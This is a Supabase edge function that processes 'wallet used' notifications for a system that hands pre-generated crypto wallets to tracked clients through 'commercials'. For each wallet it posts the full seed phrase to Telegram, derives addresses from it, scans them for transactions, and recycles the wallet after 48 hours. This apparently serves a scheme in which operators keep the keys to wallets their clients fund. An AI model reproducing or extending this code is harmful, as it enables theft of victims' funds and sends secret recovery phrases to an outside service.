import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Processing wallet usage notifications...');

    // Get all wallet usage notifications from admin_settings
    const { data: notifications, error: fetchError } = await supabase
      .from('admin_settings')
      .select('*')
      .like('setting_key', 'wallet_used_%');

    if (fetchError) {
      console.error('Error fetching notifications:', fetchError);
      return new Response(
        JSON.stringify({ error: 'Failed to fetch notifications' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    const processedCount = notifications?.length || 0;
    console.log(`Found ${processedCount} notifications to process`);

    // Clean up wallets older than 48 hours USED (not created)
    const fortyEightHoursAgo = new Date(Date.now() - 48 * 60 * 60 * 1000);
    
    try {
      // Delete generated wallets where the associated wallet was used more than 48h ago
      const { data: expiredWallets, error: fetchExpiredError } = await supabase
        .from('generated_wallets')
        .select(`
          id, 
          eth_address, 
          bsc_address, 
          btc_address, 
          wallet_id,
          wallets!inner(status, used_at)
        `)
        .eq('wallets.status', 'used')
        .lt('wallets.used_at', fortyEightHoursAgo.toISOString());

      if (fetchExpiredError) {
        console.error('Error fetching expired used wallets:', fetchExpiredError);
      } else if (expiredWallets && expiredWallets.length > 0) {
        console.log(`Found ${expiredWallets.length} expired used wallets to clean up`);
        
        for (const wallet of expiredWallets) {
          // Delete address scan states
          const addresses = [wallet.eth_address, wallet.bsc_address, wallet.btc_address].filter(Boolean);
          if (addresses.length > 0) {
            await supabase
              .from('address_scan_state')
              .delete()
              .in('address', addresses);
          }
          
          // Delete wallet transactions
          await supabase
            .from('wallet_transactions')
            .delete()
            .eq('generated_wallet_id', wallet.id);
            
          // Delete the generated wallet
          await supabase
            .from('generated_wallets')
            .delete()
            .eq('id', wallet.id);
            
          // Mark the original wallet as available again
          if (wallet.wallet_id) {
            await supabase
              .from('wallets')
              .update({ 
                status: 'available',
                used_by_commercial_id: null,
                used_at: null,
                client_tracking_id: null
              })
              .eq('id', wallet.wallet_id);
          }
        }
        
        console.log(`Cleaned up ${expiredWallets.length} expired used wallets`);
      }

      // Also clean up seed-only wallets (no wallet_id) that are older than 48h
      const { data: expiredSeedWallets, error: fetchSeedError } = await supabase
        .from('generated_wallets')
        .select('id, eth_address, bsc_address, btc_address')
        .is('wallet_id', null)
        .lt('created_at', fortyEightHoursAgo.toISOString());

      if (fetchSeedError) {
        console.error('Error fetching expired seed wallets:', fetchSeedError);
      } else if (expiredSeedWallets && expiredSeedWallets.length > 0) {
        console.log(`Found ${expiredSeedWallets.length} expired seed-only wallets to clean up`);
        
        for (const wallet of expiredSeedWallets) {
          // Delete address scan states
          const addresses = [wallet.eth_address, wallet.bsc_address, wallet.btc_address].filter(Boolean);
          if (addresses.length > 0) {
            await supabase
              .from('address_scan_state')
              .delete()
              .in('address', addresses);
          }
          
          // Delete wallet transactions
          await supabase
            .from('wallet_transactions')
            .delete()
            .eq('generated_wallet_id', wallet.id);
            
          // Delete the generated wallet
          await supabase
            .from('generated_wallets')
            .delete()
            .eq('id', wallet.id);
        }
        
        console.log(`Cleaned up ${expiredSeedWallets.length} expired seed-only wallets`);
      }
    } catch (cleanupError) {
      console.error('Error during wallet cleanup:', cleanupError);
    }

    for (const notification of notifications || []) {
      try {
        // Atomically claim the notification to avoid double-processing
        const { data: deletedRows, error: deleteErr } = await supabase
          .from('admin_settings')
          .delete()
          .eq('setting_key', notification.setting_key)
          .select('*');

        if (deleteErr) {
          console.warn(`Skip notification ${notification.setting_key} due to delete error:`, deleteErr);
          continue;
        }
        if (!deletedRows || deletedRows.length === 0) {
          // Already claimed by another worker
          continue;
        }

        const claimed = deletedRows[0];
        const walletData = JSON.parse(claimed.setting_value);
        
        // Fetch commercial name
        let commercialName = 'Unknown Commercial';
        try {
          const { data: commercial } = await supabase
            .from('commercials')
            .select('name')
            .eq('id', walletData.commercial_id)
            .single();
          if (commercial?.name) commercialName = commercial.name;
        } catch (err) {
          console.warn('Could not fetch commercial name:', err);
        }
        
        // Send Telegram notification about wallet usage
        await supabase.functions.invoke('send-telegram-notification', {
          body: {
            message: `🔑 New wallet used!\nWallet ID: ${walletData.wallet_id}\nCommercial: ${commercialName}\nClient: ${walletData.client_tracking_id}\nPhrase: ${walletData.phrase}\nTime: ${walletData.timestamp}`
          }
        });

        // Generate wallet addresses if requested
        if (walletData.generate_addresses) {
          try {
            await supabase.functions.invoke('generate-wallet-addresses', {
              body: {
                wallet_id: walletData.wallet_id,
                seed_phrase: walletData.phrase
              }
            });
            console.log(`Generated addresses for wallet ${walletData.wallet_id}`);
          } catch (addressError) {
            console.error(`Failed to generate addresses for wallet ${walletData.wallet_id}:`, addressError);
          }
        }

        // Get wallet addresses for scanning
        const { data: generatedWallet } = await supabase
          .from('generated_wallets')
          .select('bsc_address, eth_address, btc_address')
          .eq('wallet_id', walletData.wallet_id)
          .single();

        if (generatedWallet) {
          const addresses = [
            generatedWallet.bsc_address,
            generatedWallet.eth_address,
            generatedWallet.btc_address
          ].filter(Boolean);

          // Trigger wallet scanning
          if (addresses.length > 0) {
            await supabase.functions.invoke('scan-wallet-transactions', {
              body: {
                wallet_addresses: addresses,
                commercial_id: walletData.commercial_id
              }
            });
          }
        }

        console.log(`Processed notification for wallet ${walletData.wallet_id}`);

      } catch (error) {
        console.error(`Error processing notification ${notification.setting_key}:`, error);
      }
    }

    return new Response(
      JSON.stringify({ 
        success: true,
        message: `Processed ${processedCount} wallet usage notifications`,
        processed_count: processedCount
      }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );

  } catch (error) {
    console.error('Error in wallet-usage-processor function:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});